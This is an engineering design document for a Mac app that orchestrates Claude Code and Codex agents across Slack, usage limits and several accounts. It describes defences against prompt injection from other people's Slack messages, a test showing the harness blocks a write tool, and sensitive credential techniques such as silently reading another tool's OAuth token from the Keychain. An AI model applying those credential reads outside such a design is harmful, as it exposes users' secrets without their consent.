A refused attempt was then observed (two more Haiku calls, $0.0010 together,
same stub). With the production flags and system prompt and a prompt saying
"call create_item with name=x", Haiku again declined in text and only called
`list_items`. With the same flags but a neutral system prompt ("Do exactly
what the user asks") and `--output-format stream-json --verbose`, `init`
listed `mcp__stub__create_item` and `mcp__stub__list_items` (the write tool
is *visible*, just not allowed), Haiku emitted a `tool_use` for
`mcp__stub__create_item {"name":"x"}`, the `tool_result` was "Permission to
use mcp__stub__create_item has been denied because Claude Code is running in
don't ask mode", the result's `permission_denials` recorded exactly that
call, and the stub's log ends at `tools/list`, with no `tools/call` at all.
So the refusal is Claude Code's, not the model's restraint, and no change to
the flags was needed. **Not verified:** a real Linear or Gmail app,
including whether an OAuth app's saved sign-in is found when its config is
passed this way.

**Cost.** A model check is counted as a *check*, not a turn
(`UsageTotals::checks`/`priced_checks`), in the agent's usage and the
routine's own (`CheckIn::usage`, the one store runs use too), so the row
shows one line for checks and runs: "46 checks · $0.19 at API prices this
week", or tokens on a Claude plan. Model checks are at least 15 minutes
apart (default 30) and at most 24 a day per routine (`max_checks_per_day`;
the 25th waits for tomorrow and the row says so). An empty first answer
isn't trusted as a baseline until a second check agrees. Items are known by
their link, else their id, else a hash of title and date (`stable_id`),
because Haiku may name the same issue by key one time and uuid the next. An
agent setting one up gets an Allow card first naming the app, the interval,
checks a day, and what checks on this Mac have measured this week (or that
nothing has been). Every routine created, by an agent or the user, leaves a
line in the chat. At most one model check starts per tick.

They're `CheckIn`s with a `watch` (no `repeat`; `next_at` is the next check),
so cancel, pause, list and the 12-per-agent cap are shared. The time tick
ignores them. In the schedule popover, "At a time / When…" switches the
composer; a When… row shows what it waits for, what it does, how its last
check went, its week's cost, Check now (`agents_watch_check_now`), Edit,
Pause and Cancel. ⌘K: "Start work for <agent> when something happens…".
Agents set them with the `watch_for` tool. The phone gets them apart from
timed routines as `agent.watches` (without `seen`/`pending`) and shows them
read-only when `welcome.features` has `routines.when`; the Mac refuses any
schedule operation the phone sends for one (`refuse_watch_from_phone`).

Not verified against live accounts: a model check through a real connector,
and the GitHub search source (pagination included). The notifications
call's shape was checked with one read-only `gh api notifications` call.

## Slack (`agents/slack.rs`, `agents/slack_api.rs`)

Answers: **can I start my agents, and get their answer, from the Slack
thread where the work came up, with no server in between?**

**Connect (Settings → Agents → Slack, ⌘K "Talk to your agents from
Slack…").** There is no server of ours, so there is no Slack app of ours: an
OAuth app needs a client secret and an HTTPS redirect, both of which would
have to live somewhere we run (and Slack's own MCP server has no dynamic
client registration, so `oauth.rs` can't sign in to it). Instead:

1. **Open Slack…** opens `api.slack.com/apps?new_app=1&manifest_json=…`,
   prefilled (`slack_api::manifest_url`): user scopes only
   (`channels/groups/im/mpim:history` and `:read`, `im:write` for the user's
   own DM, `users:read`, `chat:write`), no bot user, no events, no socket
   mode, no token rotation.
2. The user installs it to their workspace and copies the **User OAuth
   Token** (`xoxp-…`).
3. They paste it into a masked field. `auth.test` checks it, then it goes
   into the Keychain (`<slug>-slack`, key `user-token`), is added to
   redaction, and never appears in `slack.json`, a chat, a log or the phone.
   A bot token (`xoxb-`) is refused with the reason.

An app installed only in its own workspace is internal, so the 2025 limits
on `conversations.history`/`.replies` for unlisted distributed apps don't
apply. A user token both reads as the user and posts as the user: that is
what "under your name" means here. Disconnect deletes the Keychain item;
Slack keeps the app (the user removes it there).

**Listening.** Every 30 s while connected and on (a 5 s tick also settles
replies), this Mac reads each chosen conversation (at most 20):
`conversations.history` (newest 30), plus `conversations.replies` for a
thread whose `latest_reply` is past the cursor. The first read of a
conversation is a baseline (nothing already there starts anything); a
conversation added later starts from then. `channel:ts` of what was read is
kept (500) so nothing fires twice. A refused token stops checks and says so
on the row; a rate limit waits `Retry-After`; other failures back off
(doubling, at most 15 minutes); a conversation Slack won't show, or the app
lacks a permission for, is skipped with a warning. A check that stops early
still delivers what the conversations before it found (`Checked::stopped`):
their cursors have moved past it, so it would otherwise be lost. Default listening place: the user's DM to themself.

**The trigger.** A message counts only when it starts with the trigger
(`<slug>:`, so `dashbot:`, changeable, 2–24 characters, not `/ @ # ! <`),
case aside: ordinary chatter never starts a turn. Someone else's counts only
when the user turned on **Let others start it** (off by default), and then
only when it @-mentions the user first, then the trigger; in a DM to the
user, the trigger alone. At most 5 of the user's asks start per check; other
people's have their own budget (2 per check, 10 an hour, `outside_started`),
so a colleague can neither crowd out the user's asks nor run turns on the
user's plan all day. The rest get one line in the chat.

**Whose words.** A message is the user's instruction only when Slack says the
user wrote it: `user` equals the token's own id (from `auth.test`), no
`bot_id` / `bot_profile` / `app_id`, no subtype other than
`thread_broadcast`, and not a `ts` the app posted (`posted`, kept 200, since
our own replies show up as the user's). Anything else is **outside text**:
it reaches the agent in the `<external_items>` envelope (`watch::envelope`,
tag neutralised inside), queued with `runner::enqueue_assistant` (the
outside taint: sealed memory, cards to change the team, connection reads
ask), and its chat line is a note ("Sam asked in Slack (#launch): …"), never a
bubble that looks like the user's. The user's own message is a user line
labelled "From Slack · #launch" (`AgentMessage::via`, desk and phone), queued
with `enqueue_user(.., typed: None)`: it is their request, but not *typed in
this chat*, so a Slack "yes" never answers a card and `remember_permission`
can't be satisfied from Slack. A mention in it reads as `@name`, and since
a display name is free text someone else picked yet lands in the user's
unsealed ask, every name is cut to a name (`slack_api::clean_name`: letters,
digits, spaces, `.-'_()`, one line, 32 characters).

**The reply.** When the agent is idle again, its last reply in its own chat
after the ask (a result card's title when the reply is only a card) is cut to
3,000 characters at a line ("… the rest is in the app.") and, by
`slack::decide`:

- **refused** (a line in the chat) if it's empty or holds anything shaped
  like a secret or a known Keychain value (`egress::holds_secret`), card or no
  card;
- **posted by itself** only when all four hold: the user wrote the Slack
  message themself; the turn that took it read no outside text
  (`runner::take_batch` → `slack::note_batch`; unknown after a restart counts
  as outside), its engine conversation hasn't read outside content (a web
  page, a search, mail or chat through a connection: `exposure::read_outside`,
  which lasts until Start fresh, `slack::clean_turn`) and no other user
  message came between; the agent's own level
  is **Unleashed** (which already lets it send what the user asked for); and
  the exact-text switch is **off**;
- otherwise a **"Reply in Slack?" card** in the agent's chat (desk and
  phone): where it goes, then `outward::card_block`'s "Goes out under your
  name, exactly: “…”". No Always allow; nothing waits on it; it never expires
  (`expiry.rs`). Allow (or a typed yes in the chat) posts exactly those words
  in the thread (`chat.postMessage`, `&<>` escaped, unfurls off) and leaves
  "Posted in Slack (#launch)."; Deny leaves "Not posted in Slack.".

So the default, at Steady, is a card for every reply. Agents get no Slack
tool and never hold the token; a turn told "don't post to Slack yourself"
that tries anyway goes through the usual `outward` rules (a `curl` to
`slack.com` is a send).

The reply is the one **the turn that took the ask** wrote (`slack::took`,
`slack::window`): from that turn's start to the agent's next turn's start.
A later turn's reply (a routine, another agent's request, a "When…" item
that read a stranger's email) is never posted as the answer, and an ask
still queued behind another turn waits for its own. "Read no outside text"
also means the ask was the only thing its turn answered: when one turn
answers two asks (say #board's and #launch's), the later ask's thread gets
the reply **on a card**, never by itself, since it may hold the other's
answer; the earlier gets nothing. A reply that never comes is dropped after 2 minutes of
idleness or 6 hours of work, with a line.

**Not verified** (no live Slack calls were made building this): the prefilled
manifest link against Slack's current "Create app" page; that an app with
only user scopes and no bot installs with an "Install to Workspace" button;
that Slack marks a user-token `chat.postMessage` with `app_id` (the `posted`
list covers it either way); thread pickup through `latest_reply` on a real
workspace; Slack's rate limits at 20 conversations every 30 s. Everything
else is tested against a fake Web API (`slack_tests.rs`).

**Known limits / next.** No thread context is passed with an ask (only the
message itself); messages edited to add the trigger don't count; DMs with
others are named with one `users.info` each (60 at most per listing); the
phone shows the labels and answers the card but has no Slack settings yet.

## Usage before the wall (`agents/usage.rs`, `agents/quota.rs`)

Grok Bot's bots went silent at the usage limit. Here the limit is said
before it arrives, and only from what the engines report: a *reading* is
never estimated, and no reading means no line. Forecasts are a separate,
labelled thing (see "Usage awareness" below): they never stand in for a
reading and are never shown as one.

**Cost, per agent and per routine.** Each turn's `result` (Claude Code:
`usage`, `total_cost_usd`) or `turn/completed` (Codex: tokens only) is added
to the agent's last 7 days. A turn that finished having run nothing but
routine firings, all of one routine (every check-in each of its tickets
names), is also charged to that routine (`runs::charged_to`, inside the
id-based settlement of `runs::turn_ended`); a turn shared with a person's
message or with a second routine is charged to neither, because one turn's
cost can't be split honestly. An interrupted turn's cost carries over to the
turn that replaces it, as its tickets do, so the routine is charged all of
it; a person's message anywhere in that chain unmakes it. A turn that fails
or is stopped is charged to the agent only.

Claude Code's `modelUsage[*].costBasis` is `"list"`: its dollar figure is at
API list prices, not a Pro/Max bill. So once Claude has reported a plan (a
current Claude reading, `onClaudePlan`), every Claude cost on the desk and
the phone is said in tokens instead ("96k tokens this week"). Without one (an
API-key login) the figure is shown and says what it is, visibly: "$0.84 at
API prices this week", "$3.81 at API prices · 412k tokens · …". Codex
reports no price, so it is always tokens.

**The plan's limits.** Verified on Claude Code 2.1.318 (a subscription, a
Haiku "say ok" turn, $0.004): every stream-json turn emits a
`rate_limit_event` whose `rate_limit_info.unifiedWindows.<window>` carries
`utilization` (0–1), `resetsAt` (epoch s) and `status` (`allowed`,
`allowed_warning` past 75%, `rejected`); an `allowed` event may omit the
top-level `utilization` (`testdata/claude-rate-limit.jsonl`). Codex 0.166's
app-server has `account/rateLimits/read` and the sparse
`account/rateLimits/updated` (`primary` / `secondary`: `usedPercent`,
`windowDurationMins`, `resetsAt`); it is asked once per turn. **Unverified
against a signed-in Codex account**: on this machine the read answered
"authentication required". Codex keeps a limit per model too, each snapshot
naming its `limitId`; only `codex` (or a snapshot naming none) is read, so
another model's limit never shows as "Codex usage".

Readings go into `quota.json` (`agents_quota`), and a window past its reset
is dropped. A Claude event is the account's whole picture and replaces
Claude's reading; Codex's sparse updates merge per window. A reading never
outlives the login it came from: it is cleared when a turn fails signed out,
when Codex refuses the read for authentication, and when a Claude event names
no window and no limit type (no plan on this login). The top-level
`rateLimitType` of an event without `unifiedWindows` is read only when it is
a known plan window, never e.g. `overage`.

The sidebar foot, the foot of What's in flight, and the phone's agent list
and Settings show "Claude usage 85% · resets Sat" for the fullest window,
amber from 90% (Settings' rows too), and "Claude usage limit · resets Sat"
for a used-up one. A figure stands until its reset even when no turn has run
since, and use elsewhere isn't in it, so a reading's age is said: the tooltip
names its day when it isn't today ("reported it Tue at 3:00 PM"), and once it
is more than 6 hours old the line itself says so ("Claude usage 34% · resets
Sat · read Tue"; the phone has no tooltip). The figure is kept rather than
hidden: it is still the latest the engine said, now labelled as such. A
used-up window needs no age, since it stays used up until the reset it names.

A usage-limit failure whose message gave no reset takes the engine's reported
one (`failure::with_reported_reset`). Every reset is said by one rule for the
day: today a clock time, then "tomorrow", the weekday within the week, the
date beyond it. The chat's sentence ("It resets Sat at 2:00 PM.",
`failure::clock_phrase`), the button ("Retry Sat 2:00 PM"), the sidebar row
("Usage limit · resets Sat 2:00 PM") and the foot ("resets Sat") all name
the same day. The wording lives once, in
`packages/companion-protocol/src/quota.ts`, for the desk and the phone, and
in `clock_phrase` for the Mac's own sentences.

## Usage wallets (`agents/wallet.rs`)

Answers: **when one subscription runs out, can the agents keep going on
another?** Each engine has an ordered list of accounts (Settings → Agents →
Accounts; the account row at the foot of the Agents sidebar; ⌘K "Switch
account…", "Add an account…", "Usage accounts…"). One of them is always
**this Mac's own sign-in**: the `claude` / `codex` login already on the
machine (`id: "default"`), which every turn used before wallets and still
uses while it is the only one. It can be renamed and moved down, not
removed. Until the user names it, it is shown as who it is signed in as
(the email below), else "Signed in on this Mac", and in a sentence "this
Mac's own sign-in" (`wallet::shown_name`, `line_name`); "This Mac" read as
a place, not an account, so it is never shown as a name.

**Which account is working, always in sight** (`AccountSwitcher`, words
shared with the phone in `companion-protocol/src/accountSwitcher.ts`): a
row at the sidebar's foot names the account the team's next turn starts on
and its tighter room ("Work · 39% left", "All out", "Not signed in"),
without asking for a reading itself (`agents_usage_overview` with `look:
false`). It opens one popover with every account: name, who and plan,
"In use" (a neutral check), its 5-hour and weekly room with resets, who is
set to it, and per row "Use this one now", the order arrows, Rename, Sign
in again, Remove, plus "+ Add account" (name, then the engine's own sign-in
in a terminal). Onboarding offers the same right after the engine's
sign-in ("Add another account?", skippable).

**"Use this one now"** (`agents_account_use` → `wallet::use_first`; the
phone's `agents.accounts.use`, audited) puts the account first in its
engine's order: every turn that *starts* from then on tries it first; a
turn already running finishes on the account it started on; it is refused
for an account that isn't signed in. Nothing else moves, and failover
carries on down the order as before. The conversation follows by the same
`carry_session` as any switch, and Chrome/MCP reach by `account_reach`.

**Runs on, per agent** (`Agent.account`, the … menu's "Runs on"; the
phone's agent controls): Any account (the default) or one account. Set to
one, its turns run only there (`wallet::for_agent`), never failing over to
another: when that one is out, the turn ends on the engine's usage-limit
line plus one Note saying how to let it use any account
(`runner::pinned_out_line`). Moving engine clears it; removing the account
clears it with a Note. The chat header's chip names the account its last
turn ran on (`AgentView.ranOn`, only while its engine has 2+ accounts),
"· only" when set there. Every row, This Mac included,
says who it is signed in as and its plan only as the engine's own files
record them (`agents/identity.rs`: Claude Code's `.claude.json`
`oauthAccount.emailAddress` / `planDisplayName`; Codex's `auth.json`
`id_token` `email` / `chatgpt_plan_type`), re-read on every listing and when
the window regains focus; nothing there, nothing shown. Each added account is signed in into a folder of its own,
reusing the isolation `commands/accounts.rs` already had for workspaces (an
added account's id is a fresh one, never a workspace's):

| | Claude Code | Codex |
|---|---|---|
| Folder | `CLAUDE_CONFIG_DIR=~/.<slug>/accounts/<id>/claude` | `CODEX_HOME=~/.<slug>/accounts/<id>/codex` |
| Sign-in | `claude setup-token` in a backend PTY; the printed token is captured and redacted in Rust (`claude_connect_start`), checked against the API, kept in the Keychain, injected as `CLAUDE_CODE_OAUTH_TOKEN` | `codex login` under that `CODEX_HOME` (`workspace_connect_start`), done when it exits 0 |
| Signed in means | a stored token whose recorded expiry (1 year) hasn't passed | its `auth.json` exists |

Nothing else of the account isolation comes along: no `GH_CONFIG_DIR`, no
workspace credentials, so an agent's `gh` and git identity are the user's
own on every account. The folder gets symlinks to This Mac's
`settings.json`, `CLAUDE.md`, `agents`, `commands`, `skills`, `plugins`
(Claude Code) or `config.toml`, `AGENTS.md`, `prompts`, `skills`,
`models_cache.json` (Codex), where it has none of its own, so an agent
behaves the same on every account. **Not** shared: logins and history.
Claude Code's `.claude.json` (the signed-in account *and* the user-scope
MCP servers) stays per account, but its servers are brought over (below).

**The same reach on every account** (`agents/account_reach.rs`; Claude
Code 2.1.319, read in its own code and observed on this Mac 2026-11-08):

- **MCP servers.** Before each turn on an added account, This Mac's
  user-scope `mcpServers` are merged into the account's `.claude.json`
  (`sync_servers`): only that key, atomic 0600 write, the account's own
  servers kept, a server This Mac dropped removed only if the sync put it
  there (`.synced-mcp-servers.json` beside it). Nothing else of the file is
  touched; no login is copied. The servers' OAuth tokens live in Claude
  Code's secure storage, which is per config dir (Keychain `Claude
  Code-credentials-<sha256(dir)[..8]>`, key `mcpOAuth`), so a server that
  signs in by OAuth (Figma, Webflow…) needs **one sign-in per account**. On
  a switch to an added account the app runs `claude mcp list` as that
  account in the background and says once, in a quiet Note, which need it:
  "On Personal, Figma and Webflow need a one-time sign-in … Take over
  Riley, type /mcp and sign in, then hand back." Servers with a static
  header or URL key work at once (their definition carries it; the file is
  0600 like This Mac's).
- **Claude in Chrome.** `--chrome` reaches the extension through the
  claude.ai bridge *as the claude.ai account of the OAuth token in use*
  (`bridgeConfig.getUserId`), and the extension in the user's Chrome is
  signed in to This Mac's. So on an added account `--chrome` finds no
  browser (observed: `claude --claude-in-chrome-mcp` under the account's
  `CLAUDE_CONFIG_DIR` answers "Browser extension is not connected"; under
  This Mac's it lists the browser). A turn on an added account therefore
  runs `--no-chrome` and gets the same server through `--mcp-config`,
  started by `/usr/bin/env -u CLAUDE_CONFIG_DIR -u CLAUDE_CODE_OAUTH_TOKEN
  -u CLAUDE_SECURESTORAGE_CONFIG_DIR claude --claude-in-chrome-mcp`, so it
  signs in to the bridge as This Mac and reaches the user's own Chrome.
  Claude Code drops a config entry named `claude-in-chrome`, so it is
  `user-chrome` (`account_reach::CHROME_SERVER`); `e2e_alias` maps
  `mcp__user-chrome__*` back to `mcp__claude-in-chrome__*` in the broker and
  the stream, so the browser gate, cards, "What it did" and capabilities
  treat it exactly as the real one, and the turn's prompt names the tools.
  Observed: a `--print` turn under another `CLAUDE_CONFIG_DIR` loaded
  `user-chrome` (20 tools) and `list_connected_browsers` returned the user's
  browser. Nothing for the owner to do.
- **claude.ai connectors** belong to each claude.ai account and can't be
  copied. When a switched turn's engine lists what it has, `lost_line`
  compares it with the last turn's and posts one Note: "Gmail isn't on in
  claude.ai for Personal: turn it on at claude.ai/settings/connectors while
  signed in as Personal; agents use them in your Chrome meanwhile." (or "or
  connect them here" without the browser). The access chain already falls
  back to a connection here or the user's Chrome for that service, since
  the connector is no longer in the agent's capabilities.
- **Not verified:** a full turn on the owner's real added account (its token
  is in the app's Keychain item, which nothing but the app reads without a
  prompt), and whether a `setup-token` token reaches claude.ai connectors
  at all (its scope may be inference only; then every connector is "not on"
  for that account and the Note says so, which is honest either way).

**Failover** (`runner::run_on_accounts`, around `run_turn`):

1. A turn runs on the first account, in order, that is signed in and not out
   (`wallet::choose`). With one usable account there is nothing to choose:
   it runs, and the engine says whether it can, exactly as before wallets.
2. A turn that fails as the usage limit (`failure::describe_now` →
   `FailureKind::UsageLimit`) marks its account out until the reset: the one
   in the failure (from the message, or the engine's own
   `rate_limit_event` / rate-limit snapshot read during the turn,
   `failure::with_reported_reset`). A `rate_limit_event` whose window is
   `rejected` marks it too, mid-turn (`wallet::reported_out`). No reset
   reported: out for an hour (`UNKNOWN_OUT_MS`), then tried again; one failed
   try is one quick refusal and re-marks it.
3. The turn runs again on the next account, with the same request and one
   bracketed line telling the model the last attempt stopped at a usage limit
   and to carry on rather than start over (`continue_prompt`). At most
   `MAX_SWITCHES` (4) per turn, and an account is never tried twice in one.
4. The chat gets a quiet Note whenever a turn runs on another account than
   the agent's last one: "Switched to Work: This Mac is out of usage until
   10:00 AM." (only the reset the engine reported is named; "is out of usage"
   without one). The phone shows the same Note as a Line.
5. Nothing left (two or more signed-in accounts, all out): the turn ends on
   one error line, tagged as the usage limit with the earliest reported reset
   so the usual "Retry at …" is offered: "Both Claude Code accounts have
   reached their usage limit. The first is back tomorrow at 10:00 AM." Never
   silent, and never refused while a lone account could still try.
6. Routines, check-ins and delegated turns go through the same path. Take
   over drives the session on the account the agent's turns last ran on.

**The conversation carries over.** Verified in Claude Code 2.1.318's own
code: transcripts live at `$CLAUDE_CONFIG_DIR/projects/<cwd with every
non-alphanumeric character as "-">/<session>.jsonl` (with a `<session>/`
folder beside it for sub-agents and saved tool output), and the Agent SDK's
own resume helper resumes a session by writing its transcript into another
config dir, so a copied transcript is the supported mechanism. Codex 0.166:
`$CODEX_HOME/sessions/YYYY/MM/DD/rollout-…-<thread>.jsonl`, found by id in
its sqlite state first and by a filename scan when that misses (source,
`rollout/src/list.rs`). So before a turn resumes on an account,
`wallet::carry_session` copies the **newest** copy of the transcript among
the engine's account folders into this one at the same relative path (mtime
kept, so A → B → A carries B's newer copy back). If the engine still can't
find it ("No conversation found", "no rollout found"), the existing fallback
starts a new session with the recent visible conversation (`with_recap`),
**except** on a switch after a try that already ran a tool: a new session
would see only the chat, not what its tools did, and could do it all again
(send a message twice, redo writes). That turn stops on a plain line instead
(`runner::not_carried_line`). Carried copies are written 0600.

**A recap never repeats what is on its way.** The user's message is queued
under its chat message's id (`runner::enqueue_user`), and a recap leaves out
the messages the turn answers and those queued behind it
(`runner::on_the_way`): a message sent while a turn ran was in the log *and*
on the queue, so a new session read it in the recap and then again as the new
message ("your message came through twice"). The queue also refuses the same
id twice.
Claude Code itself handles thinking written under another organization: it
says so and regenerates it (string in its binary), rather than failing.

**What is observed vs assumed** (research 2026-11-05, Claude Code 2.1.318,
Codex 0.166; sources: the installed binaries, openai/codex `main`,
anthropics/claude-code#103820, #103253, #70697):

- Claude Code's limit (observed in 2.1.304 output, #103820): a
  `rate_limit_event` with `status: "rejected"`, `resetsAt` (epoch s) and
  `rateLimitType`, then an assistant message and a `result` with
  `api_error: "usage_limit_reached"` and the text "You've hit your weekly
  limit · resets 11am (UTC)" (labels: 5-hour, weekly, Opus, Sonnet, Fable,
  usage credit), exit 1. `resetsAt` is the machine-readable reset; the text's
  time is display only. The old "Claude AI usage limit reached|<epoch>" is
  gone from 2.1.318 (still parsed). A server-side 429 throttle says "not your
  usage limit" and is not a switch. **Known gap:** #103820 reports long
  sessions exiting 1 with none of those events on stdout (only in the
  transcript); such a turn reads as an unfinished turn, not a limit, and
  doesn't fail over.
- Codex's limit (source): HTTP 429 `usage_limit_reached` with `resets_at`;
  `codex exec --json` carries only text ("You’ve hit your usage limit … try
  again at 3:15 PM.", with U+2019), app-server's `turn.error` carries
  `codexErrorInfo: "usageLimitExceeded"`; the reset is read from
  `account/rateLimits` when the text has none. Matched by text in both.
- Keychain: Claude Code 2.1.318 keys its own login per config dir
  (`Claude Code-credentials-<sha256 prefix>`); older builds shared one
  (#70697). The setup-token path is kept because it works on both and is
  already proven here.
- **Not verified:** a real failover against a live exhausted account (no
  exhausted account was available), resuming a copied transcript on a second
  real account of either engine, and Codex's keyring-backed auth
  (`cli_auth_credentials_store = "keyring"`), where `CODEX_HOME` isolation
  depends on how the "Codex Auth" item is keyed. Unit tests cover detection
  (real wordings), choosing, marking, the lines and the transcript copy.
- Falling back across engines: see "Carrying on with the other engine" below.

The plan reading (`quota.json`) is one account's picture: when a turn on
another account reports one, the old reading is cleared first
(`wallet::reading_moves_to`), so Codex's sparse updates never merge two
accounts' windows. The wallet itself is `<agents root>/wallet.json`: the
ordered accounts with their last limit, which account each agent last ran on,
and which account each engine's reading came from. Removing an account
first carries every conversation in its folder that is newer there into this
Mac's own (`wallet::keep_sessions`), so an agent that last ran on it resumes
where it was, then deletes its Keychain items and its folder (`accounts::forget_isolated_account`,
which refuses any id a workspace uses). A turn (or a taken-over terminal)
holds the account it runs on (`wallet::hold`); removing one that is held
takes it out of the list at once, so no new turn starts there, and leaves its
folder and sign-in until the last turn on it ends ("Removing after Finance's
turn ends.", `wallet::Removed::After`), then carries its conversations over
and deletes them. A quit before then finishes it at the next launch
(`wallet.json`'s `removing`, `wallet::finish_pending_removals`). The phone reads the list read-only
(`agents.accounts`) in its Settings, once an engine has more than one.

### Carrying on with the other engine (`agents/crossover.rs`)

When every account an agent may use on its own engine is out of usage, its
turns can carry on with the other engine (Claude Code ↔ Codex) if that one is
installed and signed in with room. `runner::run_on_accounts` decides around
the wallet's own loop (`run_on_engine`):

- **The user's choice, per engine** (`crossover.json` beside the wallet;
  Settings → Agents → Usage, "When every Claude Code account is out"; the
  Chief's `set_engine_fallback`, behind a card): **Ask first** (default),
  **Carry on with Codex**, or **Wait for the reset**. Ask first puts one card
  in the agent's chat when a turn ends with every account out: "All your
  Claude Code accounts are out until 4:00 PM. Carry on with Codex until
  then?" — **Always** (Allow + always: sets Carry on), **Just this time**
  (Allow: this outage, until the engine has room again, at most a week),
  **Wait** (Deny). One card per engine at a time; it isn't swept by expiry and
  closes itself ("Claude Code has room again") when the outage ends. A yes
  runs the turn again on the other engine. Older clients show Allow / Deny.
- **Never** for an agent set to one account ("Runs on"), never for the app's
  own tidy turn, never silently: the chat gets "Carried on with Codex (Claude
  Code is out until 4:00 PM)." plus, when relevant, what stays behind ("Claude
  in Chrome and the claude.ai connector Gmail stay with Claude Code; on Codex
  it uses your Chrome through the app's own extension, and your connections
  here").
- **Never twice.** A turn whose try already ran a tool before the accounts ran
  out (or a pick-up after a crash) isn't started again in a fresh session on
  the other engine: it stops on a line saying so, and the next message runs
  there. Asked in that case, the card's yes doesn't re-run it.
- **The conversation.** Engines can't open each other's sessions. The agent
  keeps `engine` and `session_id` as they were; `Agent.away` holds the other
  engine, its session there, since when and the reported reset. The first
  turn there starts a new session with the app's recap (`with_recap_as`,
  `crossover::carry_header`); later turns resume it. `run_turn` sees the
  agent as it is on that engine (`crossover::as_on`: no model, effort, pin
  or context reading of its own engine), and a confirmed session is saved to
  `away` (`save_session`). Recovery after a restart picks up the away session.
- **Back.** Once its own engine has room (an account not out, or its reset
  passed), the next turn goes home: one line, "Back on Claude Code: it has
  room again.", and its own session resumes with a recap of only what was
  said since it left (`back_header`). Start fresh while away starts fresh on
  both sides, without a recap.
- **Instructions and memory** are one file: the home's `CLAUDE.md` is Codex's
  project doc already; before and after each turn there, `AGENTS.md` in the
  home is made a link to it (`sync_instructions`). If Codex wrote an
  `AGENTS.md` of its own, the lines `CLAUDE.md` lacks are kept in memory
  under "### Saved on Codex" before it becomes the link. A bound agent's
  project's own `AGENTS.md` is never touched.
- **Shown:** the account row "Claude out · on Codex" (until when in its
  tooltip), Settings → Agents → Usage "Claude Code out · on Codex until
  4:00 PM", and the Chief's `usage_overview`.
- **Not verified:** a live turn on Codex carrying a Claude Code conversation
  (Codex isn't signed in on the development Mac), how a real Codex treats
  the `AGENTS.md` link when it writes memory, and take-over while away (it
  drives the agent's own engine's session, not the away one).

## Usage awareness (`agents/inventory.rs`, `agents/forecast.rs`, `agents/usage_plan.rs`)

Answers: **do the agents know what the user has, and use it the way they
want?** The agents (the Chief above all) can read what there is to run on,
forecast what work will cost, and follow the user's chosen usage mode. They
never slow down for limits unless the user chose that.

**The capacity inventory** (`inventory::read`; the `usage_overview` tool,
`agents_usage_overview`, the phone's `agents.usagePlan`):

- Every engine (installed, signed in, how many agents run on it, the account
  its next turn runs on by `wallet::choose`, or that every account is out),
  and every account in the wallet.
- **Each account's own reading.** `quota.json` is one picture per engine;
  each account now also keeps its last reading in `usage-readings.json`
  (`usage_plan::archive`, from the same `Step::Quota` that records
  `quota.json`), so the inventory can say what *each* account last reported,
  with when. The engine-wide reading is given to an account only when the
  wallet recorded it came from that one (`wallet::reading_from`), or the
  engine has a single account; otherwise it is nobody's, and that account
  says "No reading yet". A signed-out failure forgets that account's own
  reading too. Windows past their reset drop, as in `quota::shown`. When
  both exist, the newer of the engine-wide and the account's own is shown
  (a check without a turn is often newer than the last turn).
- **Every account read without a turn** (`agents/usage_read.rs`): on open
  (20 s after launch), every 10 minutes while the app is open, and when
  someone looks (the usage popover, Settings → Usage, the phone's
  `agents.usagePlan`, an agent's `usage_overview`, which waits up to 20 s for
  it) unless a check ran in the last 2 minutes; one at a time, never
  doubled. Each account's outcome is kept beside its reading
  (`usage_plan::Check`: `read`, `no_plan`, `cant_read` with why, `failed`)
  and served as `AccountLine.check`. A reading goes where a turn's goes
  (`usage_plan::archive`, with a pace sample), into `quota.json` too when
  it is that account's picture, and a used-up window marks the account out
  until its reset (`wallet::reported_out`). A refusal never clears a
  reading.
  - **Claude Code** (verified against a Max sign-in, 2.1.319):
    `GET https://api.anthropic.com/api/oauth/usage` with the sign-in's OAuth
    access token (`anthropic-beta: oauth-2025-04-20`), what Claude Code's
    own `/usage` reads. It answers each window (`five_hour`, `seven_day`,
    `seven_day_opus`, `seven_day_sonnet`, …) as `utilization` 0–100 and an
    RFC 3339 `resets_at`, `null` when it doesn't apply
    (`testdata/claude-oauth-usage.json` is a real answer, trimmed). The
    token is read where Claude Code keeps it: the login Keychain item
    `Claude Code-credentials` (suffixed `-<first 8 hex of sha256(config
    dir)>` when `CLAUDE_CONFIG_DIR` is set, as Claude Code names it) under
    the user's name, through `/usr/bin/security` on a pipe (Claude Code
    writes that item with it, so no prompt), else `<config
    dir>/.credentials.json`; for an added account, its own folder's item,
    then the setup token in this app's Keychain. `subscriptionType` there
    is the plan name shown ("Max plan"). The endpoint needs `user:profile`:
    a `claude setup-token` token (how accounts added here sign in) is
    refused `403 oauth_scope_insufficient` (verified). Such an account is
    read instead from the **rate-limit headers of a one-token Messages
    request** (`claude_probe`: `claude-haiku-4-5`, `max_tokens` 1, about
    twenty input tokens): the answer carries `anthropic-ratelimit-unified-7d-*`
    (`utilization` 0–1, `reset` epoch seconds, `status`) and, by Claude
    Code's own window names, `-5h-*` (verified against a real setup token:
    the 7d headers were present on a 429 from an account at its weekly
    limit, which costs nothing; the 5h ones were absent there and are
    unverified on an allowed answer). Only those headers are kept; the body
    is dropped. It is asked at most every 30 minutes and its check is marked
    `via: "headers"`. When even that gives no figure, the row says, in the
    Mac's words, that it can't be read between turns and that its limits
    show after a turn runs on it, and a scope refusal is asked again only
    every 6 hours. An access token past its `expiresAt` is not used and **never
    refreshed** here (a refresh rotates the refresh token and would sign
    Claude Code out); it reads again once any turn has refreshed it. No
    redirect is followed, and the request's error text is never kept.
    `count_tokens` was tried as a no-spend fallback for setup tokens: it
    carries no rate-limit headers.
  - **Codex** (handshake verified on 0.166; **not** against a signed-in
    account, none was available): `codex app-server` under the account's
    `CODEX_HOME`, `initialize`, `initialized`, `account/rateLimits/read`,
    then killed: no thread, no turn. Signed out it answers "codex account
    authentication required to read rate limits" (verified), said "Not
    signed in".
  - Tokens stay in memory for the one request: never argv, a log, an error
    string or the phone.
- **Total compute** (`agents/compute.rs`, `Inventory.totals`): every
  account at once. Room is only what a reading said: an account counts as
  having room when it is signed in, not out, and its current 5-hour or
  weekly (all models) reading isn't used up; one with no reading is *not
  read*, never room. Per kind of window (5-hour: `five_hour` or 300
  minutes; weekly: `seven_day` or 10080), how many read accounts have room
  and the soonest reset; of the accounts without room, the one back first.
  **Run-out across accounts** (`RunOut`, an estimate) only for an engine
  with 2+ signed-in accounts, every one read, each either out (back at a
  known time) or running out before its reset by its own pace, and none
  back before the last runs out; else nothing. Said on the desk (the usage
  popover's "All accounts", Settings → Usage's "What you have") and the
  phone's Usage sheet by `computeView` in `usageSheet.ts`, read top-down
